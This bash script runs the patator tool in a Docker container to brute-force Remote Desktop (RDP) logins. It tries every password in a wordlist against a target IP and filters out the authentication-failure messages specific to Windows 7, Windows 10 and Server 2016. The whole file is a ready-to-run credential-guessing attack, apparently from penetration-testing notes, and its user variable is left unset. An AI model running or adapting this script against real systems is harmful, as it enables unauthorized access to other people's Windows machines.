#!/usr/bin/env bash
# Note: must be run from X session (e.g. Kali with GUI)

pass='/tmp/pass.txt'
ip='127.0.0.1'
ignore='ERRCONNECT_AUTHENTICATION_FAILED' # Win7
# ignore='LOGON_FAILURE'
# ignore='ERRCONNECT_LOGON_FAILURE' # Win10/WinServer16

docker run --rm -it -v $pass:/F0 \
-v /tmp/.X11-unix:/tmp/.X11-unix -e DISPLAY=unix$DISPLAY \
patator rdp_login host=$ip user="$user" password=FILE0 0=/F0 \
-x ignore:fgrep="$ignore" -t 5
